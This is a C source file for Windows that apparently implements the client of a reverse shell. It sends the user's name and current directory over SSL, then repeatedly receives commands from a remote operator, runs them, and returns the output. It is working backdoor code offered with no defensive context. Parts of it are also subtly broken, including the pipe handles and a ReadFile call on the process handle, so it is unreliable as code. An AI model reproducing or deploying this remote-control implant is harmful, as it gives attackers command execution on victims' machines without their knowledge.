#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <openssl/ssl.h>
#include <windows.h>
#include <lmcons.h>

#include "send_receive.h"

#define SEP "<sep>"
#define INITIAL_BUFFER_SIZE 4096
#define BUFFER_INCREMENT 4096

char* getuser() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserName(username, &username_len)) {
        return strdup(username);
    } else {
        return "Unknown";
    }
}

char* getcwd_wrapper() {
    char* buffer = (char*)malloc(MAX_PATH);
    if (buffer != NULL) {
        if (GetCurrentDirectory(MAX_PATH, buffer) != 0) {
            return buffer;
        } else {
            free(buffer);
            return NULL;
        }
    } else {
        return NULL;
    }
}

char* execute_command(char* command) {
    HANDLE command_pipe;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (CreatePipe(&command_pipe, &command_pipe, &saAttr, 0)) {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        si.hStdError = command_pipe;
        si.hStdOutput = command_pipe;
        si.dwFlags |= STARTF_USESTDHANDLES;

        if (CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(command_pipe);

            size_t buffer_size = INITIAL_BUFFER_SIZE;
            char* buffer = (char*)malloc(buffer_size);
            if (buffer != NULL) {
                DWORD total_bytes_read = 0;
                DWORD bytes_read;
                while (ReadFile(pi.hProcess, buffer + total_bytes_read, buffer_size - total_bytes_read, &bytes_read, NULL) && bytes_read > 0) {
                    total_bytes_read += bytes_read;
                    if (total_bytes_read >= buffer_size - 1) { // Check if buffer is full
                        // Expand buffer
                        buffer_size += BUFFER_INCREMENT;
                        char* new_buffer = (char*)realloc(buffer, buffer_size);
                        if (new_buffer == NULL) {
                            free(buffer);
                            CloseHandle(pi.hProcess);
                            return NULL; // Memory allocation failed
                        }
                        buffer = new_buffer;
                    }
                }
                buffer[total_bytes_read] = '\0'; // Null-terminate the buffer
                CloseHandle(pi.hProcess);
                return buffer;
            } else {
                CloseHandle(pi.hProcess);
                return NULL; // Memory allocation failed
            }
        } else {
            CloseHandle(command_pipe);
            return NULL; // Failed to create process
        }
    } else {
        return NULL; // Failed to create pipe
    }
}

void shell(SSL* ssl) {
    char* username = getuser();
    char* cwd = getcwd_wrapper();
    if (username != NULL && cwd != NULL) {
        size_t total_length = strlen(username) + strlen(cwd) + strlen(SEP) + 1; // 1 for null terminator
        char* result = (char*)malloc(total_length);
        if (result != NULL) {
            snprintf(result, total_length, "%s%s%s", username, SEP, cwd);
            send_data(ssl, result);
            free(result);
        } else {
            send_data(ssl, "ERROR<sep>Error Getting username or CWD PLEASE EXIT");
            return;
        }
    } else {
        send_data(ssl, "ERROR<sep>Error Getting username or CWD PLEASE EXIT");
        return;
    }

    while (true) {
        char* recv_command = receive_data(ssl);
        char* command_result;
        if (strcmp(recv_command, "exit") == 0) {
            free(recv_command);
            break;
        }
        if (strncmp(recv_command, "cd ", 3) == 0) {
            // Change directory
            if (SetCurrentDirectory(recv_command + 3)) {
                // Directory changed successfully
                command_result = strdup("");
            } else {
                // Error changing directory
                DWORD error_code = GetLastError();
                char error_message[256];
                FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error_code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, 256, NULL);
                command_result = strdup(error_message);
            }
        } else {
            // Execute other commands
            command_result = execute_command(recv_command);
        }
        free(recv_command);
        if (command_result != NULL) {
            char* cwd = getcwd_wrapper();
            if (cwd != NULL) {
                size_t total_length = strlen(command_result) + strlen(cwd) + strlen(SEP) + 1;
                char* response = (char*)malloc(total_length);
                if (response != NULL) {
                    snprintf(response, total_length, "%s%s%s", command_result, SEP, cwd);
                    send_data(ssl, response);
                    free(response);
                } else {
                    send_data(ssl, "ERROR<sep>Error Sending Response");
                    return;
                }
                free(cwd);
            } else {
                send_data(ssl, "ERROR<sep>Error Getting CWD");
                return;
            }
            free(command_result);
        } else {
            send_data(ssl, "ERROR<sep>Error Executing Command");
            return;
        }
    }
}
